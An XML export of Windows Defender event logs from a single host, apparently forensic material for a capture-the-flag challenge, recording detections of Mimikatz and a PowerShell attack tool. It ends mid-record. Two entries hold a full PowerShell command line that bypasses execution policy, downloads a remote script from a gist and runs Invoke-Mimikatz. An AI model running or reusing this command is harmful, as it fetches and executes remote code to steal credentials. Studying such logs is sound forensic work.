<?xml version="1.1" encoding="utf-8" standalone="yes" ?>

<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">1117</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:39:06.306391"></TimeCreated>
<EventRecordID>113</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="1164"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Detection ID">{CA5F3A71-6586-4B8C-AE61-EFD49EB91ADA}</Data>
<Data Name="Detection Time">2020-10-27T02:38:32.246Z</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Threat ID">2147725502</Data>
<Data Name="Threat Name">Trojan:PowerShell/Mimikatz.A</Data>
<Data Name="Severity ID">5</Data>
<Data Name="Severity Name">Severe</Data>
<Data Name="Category ID">8</Data>
<Data Name="Category Name">Trojan</Data>
<Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:PowerShell/Mimikatz.A&amp;threatid=2147725502&amp;enterprise=0</Data>
<Data Name="Status Code">4</Data>
<Data Name="Status Description"></Data>
<Data Name="State">2</Data>
<Data Name="Source ID">2</Data>
<Data Name="Source Name">%%820</Data>
<Data Name="Process Name">Unknown</Data>
<Data Name="Detection User">NT AUTHORITY\SYSTEM</Data>
<Data Name="Unused3"></Data>
<Data Name="Path">CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c https://gist.githubusercontent.com/phwRi7EUp/146c73e8d28eab5c8b546861e06226e7/raw/881106760796a219711035fba797bafe76f22368/SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg.ps1;Invoke-Mimikatz</Data>
<Data Name="Origin ID">0</Data>
<Data Name="Origin Name">%%844</Data>
<Data Name="Execution ID">0</Data>
<Data Name="Execution Name">%%812</Data>
<Data Name="Type ID">0</Data>
<Data Name="Type Name">%%822</Data>
<Data Name="Pre Execution Status">0</Data>
<Data Name="Action ID">3</Data>
<Data Name="Action Name">%%808</Data>
<Data Name="Unused4"></Data>
<Data Name="Error Code">0x00000000</Data>
<Data Name="Error Description">The operation completed successfully. </Data>
<Data Name="Unused5"></Data>
<Data Name="Post Clean Status">0</Data>
<Data Name="Additional Actions ID">0</Data>
<Data Name="Additional Actions String">No additional actions required</Data>
<Data Name="Remediation User">NT AUTHORITY\SYSTEM</Data>
<Data Name="Unused6"></Data>
<Data Name="Signature Version">AV: 1.325.1502.0, AS: 1.325.1502.0, NIS: 1.325.1502.0</Data>
<Data Name="Engine Version">AM: 1.1.17500.4, NIS: 1.1.17500.4</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">1116</EventID>
<Version>0</Version>
<Level>3</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:39:33.130585"></TimeCreated>
<EventRecordID>114</EventRecordID>
<Correlation ActivityID="{2ed5385c-52c5-4639-b2d4-146c09be9597}" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="356"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Detection ID">{EA124937-6673-4530-8AC7-D60F67EFF8BA}</Data>
<Data Name="Detection Time">2020-10-27T02:39:33.129Z</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Threat ID">2147729106</Data>
<Data Name="Threat Name">Trojan:PowerShell/PSAttackTool.A</Data>
<Data Name="Severity ID">5</Data>
<Data Name="Severity Name">Severe</Data>
<Data Name="Category ID">8</Data>
<Data Name="Category Name">Trojan</Data>
<Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:PowerShell/PSAttackTool.A&amp;threatid=2147729106&amp;enterprise=0</Data>
<Data Name="Status Code">1</Data>
<Data Name="Status Description"></Data>
<Data Name="State">1</Data>
<Data Name="Source ID">10</Data>
<Data Name="Source Name">%%897</Data>
<Data Name="Process Name">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
<Data Name="Detection User">WIN-PTFPHFCRDJ0\user</Data>
<Data Name="Unused3"></Data>
<Data Name="Path">amsi:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
<Data Name="Origin ID">0</Data>
<Data Name="Origin Name">%%844</Data>
<Data Name="Execution ID">1</Data>
<Data Name="Execution Name">%%813</Data>
<Data Name="Type ID">0</Data>
<Data Name="Type Name">%%822</Data>
<Data Name="Pre Execution Status">0</Data>
<Data Name="Action ID">9</Data>
<Data Name="Action Name">%%887</Data>
<Data Name="Unused4"></Data>
<Data Name="Error Code">0x00000000</Data>
<Data Name="Error Description">The operation completed successfully. </Data>
<Data Name="Unused5"></Data>
<Data Name="Post Clean Status">0</Data>
<Data Name="Additional Actions ID">0</Data>
<Data Name="Additional Actions String">No additional actions required</Data>
<Data Name="Remediation User"></Data>
<Data Name="Unused6"></Data>
<Data Name="Signature Version">AV: 1.325.1502.0, AS: 1.325.1502.0, NIS: 1.325.1502.0</Data>
<Data Name="Engine Version">AM: 1.1.17500.4, NIS: 1.1.17500.4</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">1116</EventID>
<Version>0</Version>
<Level>3</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:39:33.922178"></TimeCreated>
<EventRecordID>115</EventRecordID>
<Correlation ActivityID="{57da6341-3e1a-4fef-ac8c-b20246c21c20}" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="356"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Detection ID">{EA124937-6673-4530-8AC7-D60F67EFF8BA}</Data>
<Data Name="Detection Time">2020-10-27T02:39:33.129Z</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Threat ID">2147729106</Data>
<Data Name="Threat Name">Trojan:PowerShell/PSAttackTool.A</Data>
<Data Name="Severity ID">5</Data>
<Data Name="Severity Name">Severe</Data>
<Data Name="Category ID">8</Data>
<Data Name="Category Name">Trojan</Data>
<Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:PowerShell/PSAttackTool.A&amp;threatid=2147729106&amp;enterprise=0</Data>
<Data Name="Status Code">1</Data>
<Data Name="Status Description"></Data>
<Data Name="State">1</Data>
<Data Name="Source ID">10</Data>
<Data Name="Source Name">%%897</Data>
<Data Name="Process Name">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
<Data Name="Detection User">WIN-PTFPHFCRDJ0\user</Data>
<Data Name="Unused3"></Data>
<Data Name="Path">amsi:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
<Data Name="Origin ID">0</Data>
<Data Name="Origin Name">%%844</Data>
<Data Name="Execution ID">1</Data>
<Data Name="Execution Name">%%813</Data>
<Data Name="Type ID">0</Data>
<Data Name="Type Name">%%822</Data>
<Data Name="Pre Execution Status">0</Data>
<Data Name="Action ID">9</Data>
<Data Name="Action Name">%%887</Data>
<Data Name="Unused4"></Data>
<Data Name="Error Code">0x00000000</Data>
<Data Name="Error Description">The operation completed successfully. </Data>
<Data Name="Unused5"></Data>
<Data Name="Post Clean Status">0</Data>
<Data Name="Additional Actions ID">0</Data>
<Data Name="Additional Actions String">No additional actions required</Data>
<Data Name="Remediation User"></Data>
<Data Name="Unused6"></Data>
<Data Name="Signature Version">AV: 1.325.1502.0, AS: 1.325.1502.0, NIS: 1.325.1502.0</Data>
<Data Name="Engine Version">AM: 1.1.17500.4, NIS: 1.1.17500.4</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">1117</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:39:43.362936"></TimeCreated>
<EventRecordID>116</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="1164"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Detection ID">{EA124937-6673-4530-8AC7-D60F67EFF8BA}</Data>
<Data Name="Detection Time">2020-10-27T02:39:33.129Z</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Threat ID">2147729106</Data>
<Data Name="Threat Name">Trojan:PowerShell/PSAttackTool.A</Data>
<Data Name="Severity ID">5</Data>
<Data Name="Severity Name">Severe</Data>
<Data Name="Category ID">8</Data>
<Data Name="Category Name">Trojan</Data>
<Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:PowerShell/PSAttackTool.A&amp;threatid=2147729106&amp;enterprise=0</Data>
<Data Name="Status Code">3</Data>
<Data Name="Status Description"></Data>
<Data Name="State">2</Data>
<Data Name="Source ID">10</Data>
<Data Name="Source Name">%%897</Data>
<Data Name="Process Name">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
<Data Name="Detection User">WIN-PTFPHFCRDJ0\user</Data>
<Data Name="Unused3"></Data>
<Data Name="Path">amsi:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
<Data Name="Origin ID">0</Data>
<Data Name="Origin Name">%%844</Data>
<Data Name="Execution ID">1</Data>
<Data Name="Execution Name">%%813</Data>
<Data Name="Type ID">0</Data>
<Data Name="Type Name">%%822</Data>
<Data Name="Pre Execution Status">3</Data>
<Data Name="Action ID">2</Data>
<Data Name="Action Name">%%809</Data>
<Data Name="Unused4"></Data>
<Data Name="Error Code">0x00000000</Data>
<Data Name="Error Description">The operation completed successfully. </Data>
<Data Name="Unused5"></Data>
<Data Name="Post Clean Status">0</Data>
<Data Name="Additional Actions ID">0</Data>
<Data Name="Additional Actions String">No additional actions required</Data>
<Data Name="Remediation User">NT AUTHORITY\SYSTEM</Data>
<Data Name="Unused6"></Data>
<Data Name="Signature Version">AV: 1.325.1502.0, AS: 1.325.1502.0, NIS: 1.325.1502.0</Data>
<Data Name="Engine Version">AM: 1.1.17500.4, NIS: 1.1.17500.4</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">2050</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:39:49.531994"></TimeCreated>
<EventRecordID>117</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="356"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Filename">amsistream-852870DA4EEADA9DCA9AF49998110C92</Data>
<Data Name="Sha256">6c71a9f8a9ff58cec51b8da9d61163b8a5cb56cda19949e39173e483ee505e2c</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">1116</EventID>
<Version>0</Version>
<Level>3</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:39:51.528721"></TimeCreated>
<EventRecordID>118</EventRecordID>
<Correlation ActivityID="{37e76a0e-b82e-40de-a556-b88b8ff6ba7a}" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="4952"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Detection ID">{14BE7206-05F5-463B-9625-5D72DDD9685A}</Data>
<Data Name="Detection Time">2020-10-27T02:39:51.527Z</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Threat ID">2147729106</Data>
<Data Name="Threat Name">Trojan:PowerShell/PSAttackTool.A</Data>
<Data Name="Severity ID">5</Data>
<Data Name="Severity Name">Severe</Data>
<Data Name="Category ID">8</Data>
<Data Name="Category Name">Trojan</Data>
<Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:PowerShell/PSAttackTool.A&amp;threatid=2147729106&amp;enterprise=0</Data>
<Data Name="Status Code">1</Data>
<Data Name="Status Description"></Data>
<Data Name="State">1</Data>
<Data Name="Source ID">10</Data>
<Data Name="Source Name">%%897</Data>
<Data Name="Process Name">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
<Data Name="Detection User">WIN-PTFPHFCRDJ0\user</Data>
<Data Name="Unused3"></Data>
<Data Name="Path">amsi:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
<Data Name="Origin ID">0</Data>
<Data Name="Origin Name">%%844</Data>
<Data Name="Execution ID">1</Data>
<Data Name="Execution Name">%%813</Data>
<Data Name="Type ID">0</Data>
<Data Name="Type Name">%%822</Data>
<Data Name="Pre Execution Status">0</Data>
<Data Name="Action ID">9</Data>
<Data Name="Action Name">%%887</Data>
<Data Name="Unused4"></Data>
<Data Name="Error Code">0x00000000</Data>
<Data Name="Error Description">The operation completed successfully. </Data>
<Data Name="Unused5"></Data>
<Data Name="Post Clean Status">0</Data>
<Data Name="Additional Actions ID">0</Data>
<Data Name="Additional Actions String">No additional actions required</Data>
<Data Name="Remediation User"></Data>
<Data Name="Unused6"></Data>
<Data Name="Signature Version">AV: 1.325.1502.0, AS: 1.325.1502.0, NIS: 1.325.1502.0</Data>
<Data Name="Engine Version">AM: 1.1.17500.4, NIS: 1.1.17500.4</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">1116</EventID>
<Version>0</Version>
<Level>3</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:39:51.563917"></TimeCreated>
<EventRecordID>119</EventRecordID>
<Correlation ActivityID="{fae41616-a22c-4375-b942-0b55ddd2c841}" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="4952"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Detection ID">{14BE7206-05F5-463B-9625-5D72DDD9685A}</Data>
<Data Name="Detection Time">2020-10-27T02:39:51.527Z</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Threat ID">2147729106</Data>
<Data Name="Threat Name">Trojan:PowerShell/PSAttackTool.A</Data>
<Data Name="Severity ID">5</Data>
<Data Name="Severity Name">Severe</Data>
<Data Name="Category ID">8</Data>
<Data Name="Category Name">Trojan</Data>
<Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:PowerShell/PSAttackTool.A&amp;threatid=2147729106&amp;enterprise=0</Data>
<Data Name="Status Code">1</Data>
<Data Name="Status Description"></Data>
<Data Name="State">1</Data>
<Data Name="Source ID">10</Data>
<Data Name="Source Name">%%897</Data>
<Data Name="Process Name">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
<Data Name="Detection User">WIN-PTFPHFCRDJ0\user</Data>
<Data Name="Unused3"></Data>
<Data Name="Path">amsi:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
<Data Name="Origin ID">0</Data>
<Data Name="Origin Name">%%844</Data>
<Data Name="Execution ID">1</Data>
<Data Name="Execution Name">%%813</Data>
<Data Name="Type ID">0</Data>
<Data Name="Type Name">%%822</Data>
<Data Name="Pre Execution Status">0</Data>
<Data Name="Action ID">9</Data>
<Data Name="Action Name">%%887</Data>
<Data Name="Unused4"></Data>
<Data Name="Error Code">0x00000000</Data>
<Data Name="Error Description">The operation completed successfully. </Data>
<Data Name="Unused5"></Data>
<Data Name="Post Clean Status">0</Data>
<Data Name="Additional Actions ID">0</Data>
<Data Name="Additional Actions String">No additional actions required</Data>
<Data Name="Remediation User"></Data>
<Data Name="Unused6"></Data>
<Data Name="Signature Version">AV: 1.325.1502.0, AS: 1.325.1502.0, NIS: 1.325.1502.0</Data>
<Data Name="Engine Version">AM: 1.1.17500.4, NIS: 1.1.17500.4</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">1117</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:40:00.876181"></TimeCreated>
<EventRecordID>120</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="1744"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Detection ID">{14BE7206-05F5-463B-9625-5D72DDD9685A}</Data>
<Data Name="Detection Time">2020-10-27T02:39:51.527Z</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Threat ID">2147729106</Data>
<Data Name="Threat Name">Trojan:PowerShell/PSAttackTool.A</Data>
<Data Name="Severity ID">5</Data>
<Data Name="Severity Name">Severe</Data>
<Data Name="Category ID">8</Data>
<Data Name="Category Name">Trojan</Data>
<Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:PowerShell/PSAttackTool.A&amp;threatid=2147729106&amp;enterprise=0</Data>
<Data Name="Status Code">3</Data>
<Data Name="Status Description"></Data>
<Data Name="State">2</Data>
<Data Name="Source ID">10</Data>
<Data Name="Source Name">%%897</Data>
<Data Name="Process Name">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
<Data Name="Detection User">WIN-PTFPHFCRDJ0\user</Data>
<Data Name="Unused3"></Data>
<Data Name="Path">amsi:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
<Data Name="Origin ID">0</Data>
<Data Name="Origin Name">%%844</Data>
<Data Name="Execution ID">1</Data>
<Data Name="Execution Name">%%813</Data>
<Data Name="Type ID">0</Data>
<Data Name="Type Name">%%822</Data>
<Data Name="Pre Execution Status">3</Data>
<Data Name="Action ID">2</Data>
<Data Name="Action Name">%%809</Data>
<Data Name="Unused4"></Data>
<Data Name="Error Code">0x00000000</Data>
<Data Name="Error Description">The operation completed successfully. </Data>
<Data Name="Unused5"></Data>
<Data Name="Post Clean Status">0</Data>
<Data Name="Additional Actions ID">0</Data>
<Data Name="Additional Actions String">No additional actions required</Data>
<Data Name="Remediation User">NT AUTHORITY\SYSTEM</Data>
<Data Name="Unused6"></Data>
<Data Name="Signature Version">AV: 1.325.1502.0, AS: 1.325.1502.0, NIS: 1.325.1502.0</Data>
<Data Name="Engine Version">AM: 1.1.17500.4, NIS: 1.1.17500.4</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">1116</EventID>
<Version>0</Version>
<Level>3</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:40:00.883718"></TimeCreated>
<EventRecordID>121</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="1164"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Detection ID">{D53FC5AA-BAD9-4D9D-ACDB-3E77CC747542}</Data>
<Data Name="Detection Time">2020-10-27T02:40:00.872Z</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Threat ID">2147725502</Data>
<Data Name="Threat Name">Trojan:PowerShell/Mimikatz.A</Data>
<Data Name="Severity ID">5</Data>
<Data Name="Severity Name">Severe</Data>
<Data Name="Category ID">8</Data>
<Data Name="Category Name">Trojan</Data>
<Data Name="FWLink">https://go.microsoft.com/fwlink/?linkid=37020&amp;name=Trojan:PowerShell/Mimikatz.A&amp;threatid=2147725502&amp;enterprise=0</Data>
<Data Name="Status Code">1</Data>
<Data Name="Status Description"></Data>
<Data Name="State">1</Data>
<Data Name="Source ID">2</Data>
<Data Name="Source Name">%%820</Data>
<Data Name="Process Name">Unknown</Data>
<Data Name="Detection User">NT AUTHORITY\SYSTEM</Data>
<Data Name="Unused3"></Data>
<Data Name="Path">CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c iex(new-object net.webclient).downloadstring('https://gist.githubusercontent.com/phwRi7EUp/146c73e8d28eab5c8b546861e06226e7/raw/881106760796a219711035fba797bafe76f22368/SFRCezhMdTNfNzM0bV9GMHIzdjNSfSAg.ps1')Invoke-Mimikatz;</Data>
<Data Name="Origin ID">0</Data>
<Data Name="Origin Name">%%844</Data>
<Data Name="Execution ID">0</Data>
<Data Name="Execution Name">%%812</Data>
<Data Name="Type ID">0</Data>
<Data Name="Type Name">%%822</Data>
<Data Name="Pre Execution Status">0</Data>
<Data Name="Action ID">9</Data>
<Data Name="Action Name">%%887</Data>
<Data Name="Unused4"></Data>
<Data Name="Error Code">0x00000000</Data>
<Data Name="Error Description">The operation completed successfully. </Data>
<Data Name="Unused5"></Data>
<Data Name="Post Clean Status">0</Data>
<Data Name="Additional Actions ID">0</Data>
<Data Name="Additional Actions String">No additional actions required</Data>
<Data Name="Remediation User"></Data>
<Data Name="Unused6"></Data>
<Data Name="Signature Version">AV: 1.325.1502.0, AS: 1.325.1502.0, NIS: 1.325.1502.0</Data>
<Data Name="Engine Version">AM: 1.1.17500.4, NIS: 1.1.17500.4</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">2010</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:40:02.287931"></TimeCreated>
<EventRecordID>122</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="236"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Current Signature Version">1.325.1502.0</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Unused3"></Data>
<Data Name="Unused4"></Data>
<Data Name="Domain"></Data>
<Data Name="User"></Data>
<Data Name="SID"></Data>
<Data Name="Signature Type Index">1</Data>
<Data Name="Signature Type">%%800</Data>
<Data Name="Unused5"></Data>
<Data Name="Unused6"></Data>
<Data Name="Current Engine Version">1.1.17500.4</Data>
<Data Name="Unused7"></Data>
<Data Name="Unused8"></Data>
<Data Name="Unused9"></Data>
<Data Name="Unused10"></Data>
<Data Name="Unused11"></Data>
<Data Name="Unused12"></Data>
<Data Name="Dynamic Signature Type Index">1</Data>
<Data Name="Dynamic Signature Type">%%863</Data>
<Data Name="Persistence Path">C:\ProgramData\Microsoft\Windows Defender\Scans\RtSigs\data\833d65900ee4e3a593c6104242c81c99c8071f9c</Data>
<Data Name="Dynamic Signature Version">0.0.0.0</Data>
<Data Name="Dynamic Signature Compilation Timestamp">10/27/2020 2:40:02 AM</Data>
<Data Name="Persistence Limit Type Index">2</Data>
<Data Name="Persistence Limit Type">%%870</Data>
<Data Name="Persistence Limit Value">50065408</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">2010</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:40:02.287935"></TimeCreated>
<EventRecordID>123</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="236"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
<Data Name="Current Signature Version">1.325.1502.0</Data>
<Data Name="Unused"></Data>
<Data Name="Unused2"></Data>
<Data Name="Unused3"></Data>
<Data Name="Unused4"></Data>
<Data Name="Domain"></Data>
<Data Name="User"></Data>
<Data Name="SID"></Data>
<Data Name="Signature Type Index">2</Data>
<Data Name="Signature Type">%%801</Data>
<Data Name="Unused5"></Data>
<Data Name="Unused6"></Data>
<Data Name="Current Engine Version">1.1.17500.4</Data>
<Data Name="Unused7"></Data>
<Data Name="Unused8"></Data>
<Data Name="Unused9"></Data>
<Data Name="Unused10"></Data>
<Data Name="Unused11"></Data>
<Data Name="Unused12"></Data>
<Data Name="Dynamic Signature Type Index">1</Data>
<Data Name="Dynamic Signature Type">%%863</Data>
<Data Name="Persistence Path">C:\ProgramData\Microsoft\Windows Defender\Scans\RtSigs\data\833d65900ee4e3a593c6104242c81c99c8071f9c</Data>
<Data Name="Dynamic Signature Version">0.0.0.0</Data>
<Data Name="Dynamic Signature Compilation Timestamp">10/27/2020 2:40:02 AM</Data>
<Data Name="Persistence Limit Type Index">2</Data>
<Data Name="Persistence Limit Type">%%870</Data>
<Data Name="Persistence Limit Value">50065408</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}"></Provider>
<EventID Qualifiers="">2050</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8000000000000000</Keywords>
<TimeCreated SystemTime="2020-10-27 02:40:05.529844"></TimeCreated>
<EventRecordID>124</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="2368" ThreadID="3400"></Execution>
<Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
<Computer>WIN-PTFPHFCRDJ0</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="Product Name">%%827</Data>
<Data Name="Product Version">4.18.2009.7</Data>
